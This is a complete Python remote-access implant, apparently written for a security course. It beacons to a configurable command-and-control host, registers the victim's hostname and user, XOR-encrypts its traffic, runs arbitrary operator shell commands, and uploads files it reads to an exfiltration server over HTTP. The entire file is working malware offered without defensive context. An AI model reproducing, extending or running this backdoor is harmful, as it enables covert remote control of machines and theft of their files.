#!/usr/bin/env python3
import json
import os
import socket
import struct
import subprocess
import sys
import time

try:
    from urllib.request import urlopen, Request
except ImportError:
    from urllib2 import urlopen, Request

C2_HOST = os.environ.get("C2_HOST", "127.0.0.1")
C2_PORT = int(os.environ.get("C2_PORT", "9999"))
EXFIL_HOST = os.environ.get("EXFIL_HOST", C2_HOST)
EXFIL_PORT = int(os.environ.get("EXFIL_PORT", "9090"))

_KEY = b"cs564"


def _xor(data):
    return bytes(b ^ _KEY[i % len(_KEY)] for i, b in enumerate(data))


def _send(conn, data):
    enc = _xor(data)
    conn.sendall(struct.pack(">I", len(enc)) + enc)


def _recv(conn):
    hdr = b""
    while len(hdr) < 4:
        c = conn.recv(4 - len(hdr))
        if not c:
            raise ConnectionError("closed")
        hdr += c
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        c = conn.recv(length - len(buf))
        if not c:
            raise ConnectionError("closed")
        buf += c
    return _xor(buf)


class _Shutdown(Exception):
    pass


def _handle(msg):
    command = msg.get("command", "")
    rid = msg.get("request_id", "")
    payload = msg.get("payload", {})

    if command == "HEARTBEAT":
        return {"status": "OK", "request_id": rid, "payload": {"message": "alive"}}

    elif command == "SHUTDOWN":
        raise _Shutdown()

    elif command == "SYSINFO":
        info = {
            "hostname": socket.gethostname(),
            "platform": sys.platform,
            "user": os.environ.get("USER", os.environ.get("USERNAME", "?")),
            "pid": os.getpid(),
        }
        try:
            info["ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info["ip"] = "unknown"
        return {"status": "OK", "request_id": rid, "payload": info}

    elif command == "RUN_CMD":
        cmd = payload.get("cmd", "")
        if not cmd:
            return {
                "status": "ERROR",
                "request_id": rid,
                "payload": {"message": "no cmd"},
            }
        try:
            proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            try:
                stdout, stderr = proc.communicate(timeout=15)
            except subprocess.TimeoutExpired:
                proc.kill()
                return {
                    "status": "ERROR",
                    "request_id": rid,
                    "payload": {"message": "timeout"},
                }
            return {
                "status": "OK",
                "request_id": rid,
                "payload": {
                    "stdout": stdout.decode("utf-8", errors="replace").strip(),
                    "stderr": stderr.decode("utf-8", errors="replace").strip(),
                    "returncode": proc.returncode,
                },
            }
        except Exception as exc:
            return {
                "status": "ERROR",
                "request_id": rid,
                "payload": {"message": str(exc)},
            }

    elif command == "EXFIL_FILE":
        path = payload.get("path", "")
        if not path:
            return {
                "status": "ERROR",
                "request_id": rid,
                "payload": {"message": "no path"},
            }
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except Exception as exc:
            return {
                "status": "ERROR",
                "request_id": rid,
                "payload": {"message": str(exc)},
            }
        filename = os.path.basename(path)
        url = "http://{0}:{1}/upload?filename={2}".format(
            EXFIL_HOST, EXFIL_PORT, filename
        )
        try:
            req = Request(url, data=data)
            urlopen(req, timeout=10)
            return {
                "status": "OK",
                "request_id": rid,
                "payload": {"path": path, "bytes": len(data)},
            }
        except Exception as exc:
            return {
                "status": "ERROR",
                "request_id": rid,
                "payload": {"message": str(exc)},
            }

    else:
        return {
            "status": "ERROR",
            "request_id": rid,
            "payload": {"message": "unknown command"},
        }


def beacon():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((C2_HOST, C2_PORT))

                reg = {
                    "command": "REGISTER",
                    "payload": {
                        "hostname": socket.gethostname(),
                        "os": sys.platform,
                        "user": os.environ.get(
                            "USER", os.environ.get("USERNAME", "unknown")
                        ),
                    },
                }
                _send(s, json.dumps(reg).encode())
                json.loads(_recv(s).decode())

                while True:
                    raw = _recv(s)
                    msg = json.loads(raw.decode())
                    try:
                        resp = _handle(msg)
                    except _Shutdown:
                        _send(
                            s,
                            json.dumps(
                                {
                                    "status": "OK",
                                    "request_id": "",
                                    "payload": {"message": "bye"},
                                }
                            ).encode(),
                        )
                        return
                    _send(s, json.dumps(resp).encode())

        except (ConnectionRefusedError, ConnectionError, OSError):
            time.sleep(5)
        except Exception:
            time.sleep(5)


if __name__ == "__main__":
    beacon()
